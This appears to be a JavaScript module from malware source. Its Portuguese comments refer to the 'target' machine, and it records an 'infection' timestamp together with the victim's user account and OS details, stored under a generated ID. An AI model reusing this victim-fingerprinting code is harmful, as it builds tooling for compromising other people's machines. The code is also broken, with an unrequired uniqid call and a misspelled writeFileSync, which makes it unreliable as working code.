const os = require("os");  // pesq: modl os & uniqid
const fs = require("fs");
const uniqid = ("uniqid"); 
const { sysInfoPath } = require('../config')


class MachineManager {
    static generateId() {
        // informações do alvo
        const systemInfo = {
            uuid: uniqid(),
            infection: Date.now(),
            user: os.userInfo(),
            os: {
                type: os.type(),
                platform: os.platform(),
                architechture: os.arch(),
                release: os.release()
            }        
        };

        // escreve localmente
        fs.writeFilesync(sysInfoPath, JSON.stringify(systemInfo));  

        return systemInfo;
    }

    static loadId(){
        if (!fs.existsSync(sysInfoPath)) {
            return null;
        }

        var systemInfo = JSON.parse(fs.readFileSync(sysInfoPath));   // salva infos da maq em json 
        if (typeof systemInfo != "object") {    // verif o json
            return null;
        }
        return systemInfo;
    }

    static deleteId(){
        fs.unlinkSync(sysInfoPath);
    }
}

module.exports = MachineManager;


//-5-6